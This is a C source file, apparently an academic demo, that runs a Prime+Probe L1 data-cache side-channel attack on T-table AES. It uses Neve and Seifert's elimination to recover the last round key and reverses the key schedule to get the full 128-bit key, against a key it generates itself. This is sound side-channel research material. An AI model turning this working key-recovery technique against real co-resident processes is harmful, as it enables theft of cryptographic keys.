#define _GNU_SOURCE

#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include "aes.h"

#include "libcache/cache.h"
#include "libcache/race-timing.h"

/* ----------------------------- Exeriment -----------------------------------*/
#define EXPERIMENT "aes-demo"
/* ---------------------------------------------------------------------------*/

#define PRINT_FRAME printf("-----------------------------------------------------------------------------------------------\n")

/* AES configuration. */
#define AES_TABLE_SIZE       1024 // 256 entries of 4 bytes each.
#define AES_TABLE_ENTRY_SIZE 4
// We are targeting keys of 128-bits, sizes are in bytes.
#define AES_KEY_SIZE      16
#define AES_KEY_WORD_SIZE 4
// There are 16 AES table entries in each cache line.
#define AES_CACHE_LINE_ENTRIES (CACHE_LINE_SIZE / AES_TABLE_ENTRY_SIZE)

/* Spy configuration. */
#define SPY_ROUNDS 10
#define SPY_SET_COUNT (AES_TABLE_SIZE / CACHE_LINE_SIZE) // 16
#define SPY_SET_IDX_S 32
#define SPY_SET_IDX_E (SPY_SET_IDX_S + SPY_SET_COUNT)
// L1D misses threshold for elimination.
#define SPY_MISS_THRESHOLD 0

__attribute__((aligned(4096))) int main_global_align_4kb[16] = {0};

// Plaintext and ciphertext.
uint8_t ptext[AES_BLOCK_SIZE];
uint8_t ctext[AES_BLOCK_SIZE];

// AES.
AES_KEY secret_AES_key;
uint8_t secret_key[AES_KEY_SIZE];
// HACK ----
uint32_t aes_state[8];
uint32_t aes_round_key[4];

// Neve and Seifert's elimination.
uint32_t l1d_miss_count[SPY_SET_COUNT];
uint8_t candidates[16][256];
int candidates_count[16];
// Recovered keys.
uint8_t round_key[AES_KEY_SIZE];
uint8_t recovered_key[AES_KEY_SIZE];

void new_aes_key()
{
  for (int byte = 0; byte < AES_KEY_SIZE; byte++)
    secret_key[byte] = (uint8_t) (rand() % 256);

  AES_set_encrypt_key(secret_key, 128, &secret_AES_key);
}

/*
 * reset_candidates
 * ----------------
 * The 'candidates' 2D array holds 1s to state that a byte value is a potential
 * candidate key-byte candidate.
 */
void reset_candidates(void)
{
  for (int byte = 0; byte < AES_BLOCK_SIZE; byte++) {
    candidates_count[byte] = 256;

    for (int value = 0; value < 256; value++)
      candidates[byte][value] = 1;
  }
}

/*
 * aes_elimination
 * ---------------
 * Neve and Seifert's elimination method from the paper:
 * - Advances on access-driven cache attacks on AES.
 *
 * Original implementation by Moritz Eckert.
 */
int aes_elimination(void)
{
  int idx;
  int done = 0;

  for (int set = 0; set < SPY_SET_COUNT; set++) {
    if (l1d_miss_count[set] > SPY_MISS_THRESHOLD)
      continue;

    done = 1;

    for (int byte = 0; byte < AES_BLOCK_SIZE; byte++) {

      for (int offset = 0; offset < AES_BLOCK_SIZE; offset++) {
        idx = ctext[byte] ^ (Te4[(AES_CACHE_LINE_ENTRIES * set) + offset] >> 24);

        // Eliminate.
        if (candidates[byte][idx] != 0x00) {
          candidates[byte][idx] = 0x00;
          candidates_count[byte] -= 1;
        }

        // We are done only when every key-byte has one candidate left.
        if (candidates_count[byte] > 1)
          done = 0;
      }

    }

  }

  return done;
}

void print_key(uint8_t *key)
{
  for (int byte = 0; byte < AES_KEY_SIZE; byte++)
    printf("0x%02hhX ", key[byte]);
  printf("\n");
}

/*
 * recover_aes_key
 * ---------------
 * Recover the 10th round key from the 'candidates' array. The key is written
 * on the 'recovered_key' array.
 */
void recover_aes_key(void)
{
  for (int byte = 0; byte < AES_KEY_SIZE; byte++) {
    for (int value = 0; value < 256; value++) {
      if (candidates[byte][value] != 0x00) {
        recovered_key[byte] = value;
        break;
      }
    }
  }
}

/*
 * recover_key
 * -----------
 * From the 10th-round key, recover the original key.
 *
 * Original comment:
 * https://github.com/cmcqueen/aes-min/blob/master/aes-otfks-decrypt.c
 *
 * This is used for aes128_otfks_decrypt(), on-the-fly key schedule decryption.
 * rcon for the round must be provided, out of the sequence:
 *	   54, 27, 128, 64, 32, 16, 8, 4, 2, 1
 * Subsequent values can be calculated with aes_div2().
 */
void recover_key(void)
{
  const uint8_t rcon[10] = {54, 27, 128, 64, 32, 16, 8, 4, 2, 1};

  uint8_t *key_word_0;
  uint8_t *key_word_1;

  for (int round = 0; round < 10; round++) {
    // Map the last two words (32-bits each) of 'recover_key'.
    key_word_0 = recovered_key + AES_KEY_SIZE - AES_KEY_WORD_SIZE;
    key_word_1 = key_word_0 - AES_KEY_WORD_SIZE;

    for (int word = 1; word < (AES_KEY_SIZE / AES_KEY_WORD_SIZE); word++) {
      // XOR with previous word.
      key_word_0[0] ^= key_word_1[0];
      key_word_0[1] ^= key_word_1[1];
      key_word_0[2] ^= key_word_1[2];
      key_word_0[3] ^= key_word_1[3];

      key_word_0  = key_word_1;
      key_word_1 -= AES_KEY_WORD_SIZE;
    }

    // Rotate previous word and apply S-box. Also XOR first byte with 'rcon'.
    key_word_1 = recovered_key + AES_KEY_SIZE - AES_KEY_WORD_SIZE;
    key_word_0[0] ^= Te4[key_word_1[1]] ^ rcon[round];
    key_word_0[1] ^= Te4[key_word_1[2]];
    key_word_0[2] ^= Te4[key_word_1[3]];
    key_word_0[3] ^= Te4[key_word_1[0]];
  }
}

int main()
{
  // Free cache set 0 in the L1D to keep Race-Timing free of noise.
  __attribute__((aligned(4096))) int stack_align_4kb[16] = {0};

  // Metrics.
  int spy_round = 0;
  int encryption_round = 0;

  // Prime+Probe eviction set.
  eset_l1d_t eset_l1d;
  build_eset_l1d(&eset_l1d);

  // Start Race-Timing.
  rt_server_start(4, RT_MODE_SC);

  srand(time(0));
  reset_candidates();

  printf("Round | Remaining key-byte candidates\n");
  PRINT_FRAME;

  new_aes_key();
  while (1) {
    // Random plaintext input.
    for (int byte = 0; byte < AES_KEY_SIZE; byte++)
      ptext[byte] = (uint8_t) (rand() % 256);

    memset(l1d_miss_count, 0x00, SPY_SET_COUNT * sizeof(uint32_t));

    for (int round = 0; round < SPY_ROUNDS; round++) {
      for (int set = SPY_SET_IDX_S; set < SPY_SET_IDX_E; set++) {

        // AES rounds 0-9.
        AES_encrypt_round(ptext, &secret_AES_key, aes_state, aes_round_key);

        // Prime one L1D 'set'.
        prime_l1d_set(&eset_l1d, set);

        // AES final round.
        AES_encrypt_final(ctext, aes_state, aes_round_key);

        // Probe one L1D 'set' via Race-Timing.
        l1d_miss_count[set - SPY_SET_IDX_S] += probe_l1d_set_rt_sc(&eset_l1d, set);

        encryption_round++;
      }
    }

    // Print remaining candidates.
    printf("  %3d | ", spy_round++);
    for (int i = 0; i < SPY_SET_COUNT; i++)
      printf("%3d ", candidates_count[i]);
    printf("\n");

    if (aes_elimination()) {
      PRINT_FRAME;
      printf("secret_key    : ");
      print_key(secret_key);

      // Recover the 10th round key.
      recover_aes_key();

      // From  the 10th round key, recover the original key.
      recover_key();

      // Print the original key.
      PRINT_FRAME;
      printf("recovered_key : ");
      print_key(recovered_key);

      // Print metrics.
      PRINT_FRAME;
      printf("Elimination rounds : %d\n", spy_round);
      printf("Encryption rounds  : %d\n", encryption_round);

      // We are done.
      break;
    }
  }

  rt_server_stop();

  allocate_free_all();
}
